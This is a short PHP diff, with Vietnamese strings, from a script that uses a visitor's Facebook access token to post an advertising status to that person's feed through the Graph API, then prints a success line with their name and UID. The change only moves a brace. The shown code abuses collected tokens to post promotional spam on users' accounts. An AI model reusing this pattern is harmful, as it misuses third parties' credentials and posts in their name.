@@ -33,8 +33,9 @@ Cảm ơn bạn đã sử dụng Website của mình.
 Mạn phép cho mình xin 1 status quảng cáo nhé.
 🚹=========🚺🚺=========🚹';
 auto('https://graph.facebook.com/me/feed?access_token='.$token.'&message='.urlencode($msg).'&method=post');
-}
+
 echo '<span style="color:red">Đã upstt cho nick: </span><span style="color:#0E0101">'.$name.'</span> <span style="color:red">UID: </span><span style="color:#0E0101">'.$idfb.'</span> <hr/><span style="color:green"> [SUCCESS]</span><hr/>';
+}
 
 function auto($url) {
    $ch = curl_init();
